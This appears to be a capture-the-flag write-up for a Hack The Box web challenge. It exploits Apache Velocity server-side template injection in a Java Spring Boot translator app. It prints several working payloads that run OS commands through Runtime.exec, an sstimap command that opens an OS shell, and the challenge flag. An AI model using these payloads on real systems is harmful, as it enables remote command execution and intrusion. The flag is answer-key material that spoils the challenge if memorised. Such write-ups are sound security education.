## Title

Labyrinth Linguistic

## Description

You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.

## Solution

Looking at the config files, it is a java application.
Server: `java -jar /app/target/server.jar`
It uses spring boot(pom.xml).
The only file that matters is main.java.

Basically this is a website that receives a string and translate it to another language.
what the user add to the parameter it will inject into the template using velocity.
Searching for "velocity template injection" we found [this](https://antgarsil.github.io/posts/velocity/).
TEsting for the vulnerability with `#set ($run=1 + 1) $run ` we get `2` so we know it is vulnerable.

Every website points to the same RCE payload and it seems like I cant use it.
Payload: 
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

After some time i found this [website](https://iwconnect.com/apache-velocity-server-side-template-injection/), with the following template:

```
#set($s="")
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
#set($readerClass=$stringClass.forName("java.io.Reader"))
#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
#set($systemClass=$stringClass.forName("java.lang.System"))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat+/flagabf03b9138.txt"))
#set($null=$process.waitFor() )

#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())

#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))

$output
```

First I have executes `ls /` then with the flag name i did `cat flag....txt`.
FLag: `HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}`

## Other solutions

```
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami")
```

``` 
python3 sstimap.py --url http://94.237.49.166:35229/ -f --os-shell --engine velocity
```




## References

- https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#velocity-java
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java---velocity
- https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- 

